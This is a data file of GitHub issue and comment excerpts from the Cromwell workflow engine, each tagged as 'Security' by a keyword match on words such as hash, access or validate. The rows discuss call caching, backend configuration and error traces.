gs://fc-9c84e685-79f8-4d84-9e52-640943257a9b/3beb06ee-6f01-4a9d-8bb7-e8eacd214561/lego_plotter_workflow/f525deea-91b9-4365-b31d-2a2a3ae3346d/call-lego_plotter_task/glob-fc36854b6867c1581ab159b09dd7e2f4; gs://fc-9c84e685-79f8-4d84-9e52-640943257a9b/3beb06ee-6f01-4a9d-8bb7-e8eacd214561/lego_plotter_workflow/f525deea-91b9-4365-b31d-2a2a3ae3346d/call-lego_plotter_task/glob-fc36854b6867c1581ab159b09dd7e2f4/THCA-BJ-A0Z2-TP-NB.maf.mutation_CCG_histogram.png; gs://fc-9c84e685-79f8-4d84-9e52-640943257a9b/3beb06ee-6f01-4a9d-8bb7-e8eacd214561/lego_plotter_workflow/f525deea-91b9-4365-b31d-2a2a3ae3346d/call-lego_plotter_task/glob-fc36854b6867c1581ab159b09dd7e2f4/THCA-BJ-A0Z2-TP-NB.maf.mutation_coverage.png; gs://fc-9c84e685-79f8-4d84-9e52-640943257a9b/3beb06ee-6f01-4a9d-8bb7-e8eacd214561/lego_plotter_workflow/f525deea-91b9-4365-b31d-2a2a3ae3346d/call-lego_plot",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2266:259,hash,hash,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2266,1,['hash'],['hash']
Security,Make timing diagram more accessible,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4473:25,access,accessible,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4473,1,['access'],['accessible']
Security,Making the Validate API endpoint use the new ValidateActor. Closes #489,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548:11,Validat,Validate,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548,2,['Validat'],"['Validate', 'ValidateActor']"
Security,"Managed to fix the problem. Cromwell 32 errorred and explained the problem. The filesystem section was moved to the SGE section. Are config file now looks like this:; ```HOCON; backend {; default=""SGE""; providers {; SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10000; runtime-attributes= """"""; Int? cpu=1; Int? memory=4; """"""; submit = """"""; qsub \; -terse \; -V \; -b n \; -wd ${cwd} \; -N ${job_name} \; ${'-pe BWA ' + cpu} \; ${'-l h_vmem=' + memory + ""G""} \; -o ${out} \; -e ${err} \; ${script}; """"""; kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". filesystems {; local {; localization: [; ""soft-link"", ""copy"", ""hard-link""; ]; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; }; }; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197:819,hash,hashing-strategy,819,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3109#issuecomment-402984197,1,['hash'],['hashing-strategy']
Security,Manually tested and working for public PDC and Kids First staging data. Not currently working for controlled access staging data though I suspect the issue is not in this code. I do not currently know of controlled access PDC data.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6485:109,access,access,109,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6485,2,['access'],['access']
Security,"Maybe an example would also help:; ```wdl; workflow foo {; ...; runtime {; memory: ""2GB"" # ignored for call caching; }; }; ```. ```wdl; workflow foo {; String memory_string # hashed for call caching; runtime {; memory: memory_string # still ignored for call caching; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348295352:175,hash,hashed,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2927#issuecomment-348295352,1,['hash'],['hashed']
Security,"Member access, binary, unary and if/then/else expression evaluation",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3355:7,access,access,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3355,1,['access'],['access']
Security,Merge to develop gated on a BT-219 release of Martha that supports access urls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6312#issuecomment-827658854:67,access,access,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6312#issuecomment-827658854,1,['access'],['access']
Security,Messages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException: cromwell.services.womtool.impl.WomtoolServiceInCromwellActor; 	at java.net.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:4057,Hash,HashMap,4057,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security,Metadata Integrity: await write confirmation on final workflow status metadatum [CROM-6443],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6196:9,Integrity,Integrity,9,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6196,1,['Integrity'],['Integrity']
Security,"Migrate existing failures in the metadata database from the former un-flat failure metadata style:; ```; ""failures"": [{; ""causedBy"": {; ""causedBy"": {; ""message"": ""connect timed out""; },; ""message"": ""Error getting access token for service account: ""; },; ""message"": ""Failed to upload authentication file""; }]; ```. to the new flat style that new workflow metadata will be created with:; ```; ""failures"": [{; ""message"": ""connect timed out""; }, {; ""message"": ""Failed to upload authentication file""; }, {; ""message"": ""Error getting access token for service account: ""; }]; ```. Also note that aggregated exceptions were previously being input using the same random integer for every message part (i.e. every part of the aggregate was overwriting the previous one), so migration could... fix that.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2039:213,access,access,213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2039,4,"['access', 'authenticat']","['access', 'authentication']"
Security,Mix one line of super obvious fix with 45 lines of conformance hash repinning noise.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3566:63,hash,hash,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3566,1,['hash'],['hash']
Security,"More details about recreating the error here: https://gatkforums.broadinstitute.org/firecloud/discussion/10740/error-the-local-copy-message-must-have-path-set. Essentially, if a task looks like ; ```; task t {; 	File x = """"; 	; 	command {; ...; 	}; 	runtime {; ...; 	}; }; ```; The job fails with: ; ```; BackendJobDescriptorKey_CommandCallNode_w.t:-1:1/CCHashingJobActor-b12fef61-w.t:NA:1] Failed to hash ; cromwell.core.path.PathParsingException: java.lang.IllegalArgumentException: Either exists on a filesystem not supported by this instance of Cromwell, or a failure occurred while building an actionable path from it. Supported filesystems are: Google Cloud Storage. Failures: Google Cloud Storage: does not have a gcs scheme (IllegalArgumentException) Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.core.path.PathFactory$.$anonfun$buildPath$4(PathFactory.scala:64); 	at scala.Option.getOrElse(Option.scala:121); 	at cromwell.core.path.PathFactory$.buildPath(PathFactory.scala:58); 	at cromwell.core.path.PathFactory.buildPath(PathFactory.scala:30); ```. AC: ; 1. In case that a user has set the value of a required File as an empty string --this error message should instead accommodate for this special case and point out that an empty string isn't valid input for a File object. ; 1b. If easy, it would also be nice to remove the link to the HPC config docs and the rest of the info about supported filesystems. ; [Optional] 2. If this doesn't hurt performance somehow, it would be nice if the error message also included the name of the input that failed to hash, not just the name of the call/value of the file.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4158:401,hash,hash,401,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4158,2,['hash'],['hash']
Security,"Most of this is just wiring so start by looking at the changes in CallCacheReadActor. I've updated it and made it accessed via a global, routed actor in CromwellRoot. Tests will inject their own dummy version. Mainly this makes testing easier as it's easier to inject the actor rather than relying on it being created to aim at an empty database. Potential downside: actor hierarchy is a little bit more top heavy now :(",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1326:114,access,accessed,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1326,3,"['access', 'inject']","['accessed', 'inject']"
Security,Motivating case: [link](https://github.com/broadinstitute/cromwell/blob/cjl_initial_work_dir_requirement_3/centaur/src/main/resources/standardTestCases/InitialWorkDirRequirement/input_string.cwl). The entry field of a Dirent can now be used to access inputs and evaluate ECMAScript expressions. - [x] Rebase and target develop after merging https://github.com/broadinstitute/cromwell/pull/3087,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3089:244,access,access,244,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3089,1,['access'],['access']
Security,Motivation: This is a feature requested by the Mint team. They want the total number of results matching a query to be included in the query response. Mint wants to expose the total results count through the Job-Manager UI.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3126:165,expose,expose,165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3126,1,['expose'],['expose']
Security,Move + generalize DB access for restart / resume,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/581:21,access,access,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/581,2,['access'],['access']
Security,Move Backend Specific Validation into constructor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/651:22,Validat,Validation,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/651,1,['Validat'],['Validation']
Security,Move BackendCall.hash to JobDescriptor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/515:17,hash,hash,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/515,1,['hash'],['hash']
Security,Move hash to wdl4s + backend,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/490:5,hash,hash,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/490,1,['hash'],['hash']
Security,Moved hash into backend. Closes #515,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/549:6,hash,hash,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/549,1,['hash'],['hash']
Security,"Much like our operation polling the creation of new runs in jes winds up being a problem when lots of jobs are created at once as we wind up with a ton of threads gumming up the works but still can only submit at the rate of the genomics api qps. It'd be way more fun to use those threads for things like DB access, mining bitcoins, skynet, etc. Transform the JesPollingActor & friends such that that structure manages both create and get operations (the batch API allows for heterogenous requests) are going through the same structure metered by the QPS supplied by the config file.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1798:308,access,access,308,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1798,1,['access'],['access']
Security,"My WDL pipeline failed to run with Cromwell 55 configured with the `cromwell.backend.google.pipelines.v2beta.PipelinesApiLifecycleActorFactory` Google API with a long list of errors such as the following:; ```; ...; {; ""causedBy"": [; {; ""causedBy"": [; {; ""message"": ""504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media"",; ""causedBy"": []; }; ],; ""message"": ""Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""[Attempted 1 time(s)] - IOException: Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""Workflow failed""; ```; I was under the expectation that this had been handled in issue #5344 and that Cromwell would retry to access the files until available (the files do indeed exist at the time of this writing).",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6154:1438,access,access,1438,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154,1,['access'],['access']
Security,"NB I think this should be renamed to ""... into `validate()` on the `BackendWorkflowInitializationActor`"" :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/651#issuecomment-209968612:48,validat,validate,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/651#issuecomment-209968612,1,['validat'],['validate']
Security,"NB this didn't happen when the `[0]` wasn't part of the output declaration. If I had to guess, I'd say the FileEvaluator is looking for GlobFiles to expand, but is missing this one because it looks like an array member access rather that a GlobFile type.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1980#issuecomment-280026759:219,access,access,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1980#issuecomment-280026759,1,['access'],['access']
Security,"NULL, LABELS VARCHAR(255) NULL, DEPLOYMENT_ID VARCHAR(10) NULL); 2019-01-31 18:29:35,271 INFO - SELECT COUNT(*) FROM cromwell.DATABASECHANGELOG; 2019-01-31 18:29:35,279 INFO - Reading from cromwell.DATABASECHANGELOG; 2019-01-31 18:29:35,280 INFO - SELECT * FROM cromwell.DATABASECHANGELOG ORDER BY DATEEXECUTED ASC, ORDEREXECUTED ASC; 2019-01-31 18:29:35,282 INFO - SELECT COUNT(*) FROM cromwell.DATABASECHANGELOGLOCK; 2019-01-31 18:29:35,461 INFO - Successfully released change log lock; 2019-01-31 18:29:35,469 ERROR - Failed to instantiate Cromwell System. Shutting down Cromwell.; java.lang.ArrayIndexOutOfBoundsException: 1; 	at liquibase.datatype.DataTypeFactory.fromDescription(DataTypeFactory.java:251); 	at liquibase.change.core.CreateTableChange.generateStatements(CreateTableChange.java:70); 	at liquibase.change.AbstractChange.generateStatementsVolatile(AbstractChange.java:287); 	at liquibase.change.AbstractChange.warn(AbstractChange.java:358); 	at liquibase.changelog.visitor.ValidatingVisitor.visit(ValidatingVisitor.java:109); 	at liquibase.changelog.ChangeLogIterator.run(ChangeLogIterator.java:83); 	at liquibase.changelog.DatabaseChangeLog.validate(DatabaseChangeLog.java:269); 	at liquibase.Liquibase.update(Liquibase.java:198); 	at liquibase.Liquibase.update(Liquibase.java:179); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:62); 	at cromwell.database.migration.liquibase.LiquibaseUtils$.updateSchema(LiquibaseUtils.scala:34); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1(ServicesStore.scala:11); 	at cromwell.services.ServicesStore$EnhancedSqlDatabase$.$anonfun$initialized$1$adapted(ServicesStore.scala:11); 	at cromwell.database.slick.SlickDatabase.$anonfun$withConnection$1(SlickDatabase.scala:155); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:70); 	at slick.jdbc.SimpleJdbcAction.run(StreamingInvokerAction.scala:69); 	at slick.basic.BasicBackend$DatabaseDef$$anon$2.lif",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4605:2688,Validat,ValidatingVisitor,2688,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4605,1,['Validat'],['ValidatingVisitor']
Security,"Name=METADATA_ENTRY', '', 'EXECUTED', NULL, NULL, '3.6.3', '3752074629'); 2019-07-21 23:34:35,956 INFO - Successfully released change log lock; 2019-07-21 23:34:36,224 WARN - Unrecognized configuration key(s) for Jes: filesystems.gcs.project, name-for-call-caching-purposes, slow-job-warning-time; 2019-07-21 23:34:36,976 INFO - Slf4jLogger started; 2019-07-21 23:34:37,408 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-673c553"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""failureShutdownDuration"" : ""5 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; 2019-07-21 23:34:37,771 cromwell-system-akka.actor.default-dispatcher-3 INFO - KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; 2019-07-21 23:34:37,918 cromwell-system-akka.dispatchers.service-dispatcher-14 INFO - Metadata summary refreshing every 1 second.; 2019-07-21 23:34:38,046 WARN - 'docker.hash-lookup.gcr-api-queries-per-100-seconds' is being deprecated, use 'docker.hash-lookup.gcr.throttle' instead (see reference.conf); 2019-07-21 23:34:38,160 cromwell-system-akka.dispatchers.service-dispatcher-13 INFO - WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; 2019-07-21 23:34:38,160 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - JobStoreWriterActor configured to flush with batch size 1000 and process rate 1 second.; 2019-07-21 23:34:38,594 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; 2019-07-21 23:34:38,667 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2019-07-21 23:34:39,131 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - Running with 3 PAPI request workers; 2019-07-21 23:34:39,132 cromwell-system-akka.dispatchers.backend-dispatcher",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5084:2174,hash,hash-lookup,2174,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5084,1,['hash'],['hash-lookup']
Security,Need to validate that file inputs from JSON are valid paths,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2367:8,validat,validate,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2367,1,['validat'],['validate']
Security,"New info since our meeting earlier today:. I was able to confirm that Batch actually *can* pull and run Docker Image Format v1 images (PR to explicitly assert this [here](https://github.com/broadinstitute/cromwell/pull/7522)). So that does not appear to be the source of my private Docker woes. I also pushed a new image that is just a re-tag of `ubuntu:latest` to `broadinstitute/cloud-cromwell:2024-08-30`. Trying to run with that, with or without the `docker.io/` prefix results in the error:. ```; docker: Error response from daemon: pull access denied for broadinstitute/cloud-cromwell, repository does not exist or may require 'docker login': denied: requested access to the resource is denied. ```. which is a complaint about being able to access the repository, not the format of a particular image within the repository. Not sure what's going on here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095:543,access,access,543,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7515#issuecomment-2322317095,3,['access'],['access']
Security,"New thoughts/additional info. . I just tried a workflow that evaluates all the way to the end successfully (and had been run before on the same data and no, call caching didn't happen, as is expected with AWS backend), with the exception of adding workflow options to specify the output and logs directories for the final results. . Interestingly enough the new prefixes were generated but files were not transferred over EXCEPT for the log. The workflow log transferred just fine. In the log there appears to be no errors or indication that the intended outputs were not successfully transferred over. . I'm looking at the workflow status, and while all the files were made correctly (so all tasks completed successfully), but the workflow as a whole failed b/c it knows it failed to transfer over the output data. However again, there are no errors indicated in the metadata indicating why no files were copied. . I'm wondering if this too would be expected to be a hashing failure? Are the identities of the files created that are intended as outputs defined by the hashing? Would this behavior be expected given the current issues with call caching? Or is this a new issue?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-462857084:968,hash,hashing,968,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-462857084,2,['hash'],['hashing']
Security,"Next phase of #2835. A CWL centaur test should be added that validates expected call/workflow outputs. The famous 3-step workflow uses `ps` to generate outputs, meaning that the actual content is highly variable depending on what other processes are running at the time. Instead, a stable output should be generated, something like [`""OH NO!\nOH NO!\n1""`](https://github.com/broadinstitute/cromwell/blob/f2d1c3bdd5535d9f6a997eadaf136742d86adbe5/centaur/src/main/resources/standardTestCases/continue_on_return_code.test#L11). If the output of the task is a File (path or CWL-File), the output may be affected by #2899.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2924:61,validat,validates,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2924,1,['validat'],['validates']
Security,"Not 100% sure what wasn't working at what point. I suspect that based on the order of the original commits<sup>1</sup>, the `RunMysql` and server should have both worked at ""4."". At that point I believe the config `url` still contained `useSSL=true`, the application config was being passed on the command line, and the mysql jdbc code should have been in the main assembly. By the time I was running ""11."" earlier today, the configuration `url` no longer contained `useSSL=true`, and connections within `SlickDataAccess` were returning the error combo:. ```; java.sql.SQLTimeoutException: Timeout after 1000ms of waiting for a connection.; ...; Caused by: java.sql.SQLException: Access denied for user '…'@'…' (using password: YES); ```. I did add another variable in ""11."" by always testing with `useSSL=true&requireSSL=true`, but according to the [logs](http://pastebin/209) of the latest 'RunMysql', `jdbcMain` and `jdbcRequireSsl` passed. So that _shouldn't_ have changed the results. Meanwhile, all test combinations of setting ssl worked for both slick and raw datasource connections, in tests via the url (*Ssl*), or via the dataSource properties (*Prop). So I think just setting back the `useSSL=true` is the minimum required fix, but I'd prefer to see `requiredSSL=true` added as well, as was successfully run in `slickSslDriver`. <sup>1</sup> What I believe is the previous order of the commits:; 1. Updated run.sh to pass in the mysql key & trust stores.; 2. log database config; 3. make mysql not test-only; 4. Add config file option in run.sh to make container use custom configuration; 5. debugging ""script""; 6. log actual uniquified config; 7. Test at JDBC level.; 8. hardcode use of SSL; 9. count rows in WORKFLOW_EXECUTION; 10. Logging the just the URL in SlickDataAccess, not the entire config.; 11. Added a suite of mysql ssl test.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815:680,Access,Access,680,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/85#issuecomment-123520815,2,"['Access', 'password']","['Access', 'password']"
Security,"Not a huge deal, but otherwise the temp directory may only be accessible by the container user (likely root) without a `sudo`. This can be an issue when trying to scan or clean up the workflow directory.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2053:62,access,accessible,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2053,1,['access'],['accessible']
Security,"Not really for this PR I think, but looking at the `validateInputs` method, it only validates the inputs if a file was passed (makes sense), but if no input file is specified and the WDL does need an input, validation will return success, which is weird IMO.; @geoffjentry My 2 cents are I personally prefer having small short-lived actors instead of a singleton actor that handle all the requests. I think it's more robust, faster, and less leading towards godlike actors.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195393365:52,validat,validateInputs,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195393365,3,['validat'],"['validateInputs', 'validates', 'validation']"
Security,"Not super urgent, but yes I agree. Ideally we would have access to each of the hashes that get hash cached so we could compare them later to see if things changed (i.e. file hashes, other input hashes, docker image hashes, etc)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256449537:57,access,access,57,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1629#issuecomment-256449537,6,"['access', 'hash']","['access', 'hash', 'hashes']"
Security,"Not sure if ""scatter"" is the right summary word here but:. Chris Whelan ran a job that sharded 60 different ways, each with 555 samples. . Cromwell was bottlenecked trying to hash all these, and ultimately many of the has requests timed out. It's potentially a spurious correlation, but CPU was pegged at 100% during this time.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3706:175,hash,hash,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3706,1,['hash'],['hash']
Security,"Not sure if this is a separate issue or not, but when @knoblett and I were submitting a workflow yesterday we got the exact same error message (submitted with Swagger). The issue for her was that there was an input that was specified to be a File type, but in reality it was just a String (so I'm guessing the issue was similar in that it couldn't find the ""file""). Unfortunately, it validated just fine, but we weren't able to submit it. . I'd be happy to provide the WDL and JSON files (both the broken version and the fixed version) but they won't attach in a github comment.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209931581:384,validat,validated,384,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/703#issuecomment-209931581,1,['validat'],['validated']
Security,"Note for future tech talk: The hash lookup will not work for private images when running locally, even though the job might run fine. This is because when running locally, as long as the user is logged in properly (with `docker login` or `gcloud login`), the docker command will be able to retrieve the image. However Cromwell does not go look for the user's docker config file on the machine to extract the auth information and use it when looking up the hash.; Another option would be to allow explicit declaration of authentication strategies in the config file (like we have for google). Currently only JES has a `dockerhub` entry. It could be generalized at the root level with something like; ```. dockerhub {; auths [; {; # this would look at ~/.docker/config.conf for example; name = ""application-default""; scheme = ""application_default""; },; {; name = ""custom""; scheme = ""custom""; account = ""bla""; token = ""bla""; }; ]; }; ```. and then any backend could do. `dockerhub-lookup.auth = ""application-default""`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1969#issuecomment-279087577:31,hash,hash,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1969#issuecomment-279087577,3,"['authenticat', 'hash']","['authentication', 'hash']"
Security,"Note to @kcibul - this is just a placeholder for now, not a would-be punching bag like ""log smarter, not harder"" :). As I'm rewriting CromwellTestKitSpec and thus going through all of the variations of the ""run a wdl and check outputs/logs/etc"" tests in the codebase, I'm realizing that the extent of overlap with Centaur is even larger than I'd previously thought. We need to bring sanity to this ...; - On one hand, all of these ""run a full workflow"" type tests belong in Centaur. If not, define what Centaur is for, if anything; - On the other hand, having rapid feedback via sbt test is useful; - And people find it annoying to write proper ""unit"" tests on behavior; - I'd argue this is a code smell, our business logic is too wrapped up with the actor-y stuff. But that's part of what we need to decide. At the very least, we need to hash out WTF _is_ a ""unit test"" (i.e. running by 'sbt test'), what belongs in Centaur, etc.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1269:839,hash,hash,839,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1269,1,['hash'],['hash']
